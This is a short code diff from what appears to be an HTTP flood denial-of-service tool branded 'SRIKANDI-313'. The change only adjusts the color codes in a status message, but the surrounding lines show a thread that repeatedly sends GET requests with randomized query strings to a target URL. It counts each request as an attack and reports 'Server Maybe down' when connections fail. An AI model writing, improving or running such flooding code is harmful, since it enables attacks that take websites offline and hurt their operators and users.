@@ -141,7 +141,7 @@ class httpth1(threading.Thread):
                 randomized_url = url + "?" + genstr(random.randint(3, 10))
                 requests.get(randomized_url, headers=headers)
                 u += 1
-                print(f"\033[35m[+] \033[94mExecution_target \033[41m" +str(url)+ "\033[32mnum_attack" +u+ "")
+                print(f"\033[35m[+] \033[94mExecution_target\033[0m \033[41m" +str(url)+ "\033[32mnum_attack" +u+ "")
             except requests.exceptions.ConnectionError:
                 print(f"\033[97m[] \033[103mSRIKANDI-313\033[0m  \033[7mConnection-error\033[0m \033[31mServer Maybe down\033[0m")
 
